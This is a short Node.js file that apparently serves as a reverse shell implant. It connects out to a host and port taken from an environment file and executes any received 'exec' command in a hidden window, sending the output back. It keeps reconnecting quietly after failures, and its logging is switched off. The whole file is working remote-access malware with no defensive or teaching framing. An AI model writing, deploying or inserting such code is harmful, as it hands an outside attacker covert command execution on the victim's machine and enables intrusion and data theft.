const net = require("net");

const util = require("util");
const exec = util.promisify(require("child_process").exec);
const process = require("process");

const shell = require("./shell");

require("dotenv").config({ path: __dirname + "./../config/.env" });

let path = process.cwd();

const PORT = process.env.PORT;
const HOST = process.env.HOST;


const client = new net.Socket();
function connect() {
  client.connect(PORT, HOST, () => {
    // console.log(`Connected to ${host}:${port}`);
  });
}

client.on("data", (data) => {
	let dataStr = data.toString().toLowerCase();
  if (
    dataStr.startsWith("exec") &&
    dataStr.split(" ")[1] === "cd"
  ) {
    path = shell.changeDir(data, path);
  }

  async function execute(command) {
    await exec(
      command,
      { cwd: path, windowsHide: true },
      (e, stdout, stderr) => {
        client.write(`${stdout}\n`);
      }
    );
  }
  if (dataStr.toLowerCase().startsWith("exec"))
    execute(dataStr.replace("exec", ""));
});

client.on("close", (e) => {
  // console.log(`${HOST}:${PORT} not found. Attempting to reconnect.`);
  client.setTimeout(5000, () => {
    client.connect(PORT, HOST);
  });
});

client.on("error", (err) => {
  setTimeout(() => {
    connect();
  }, 10000);
});

client.connect(PORT, HOST);
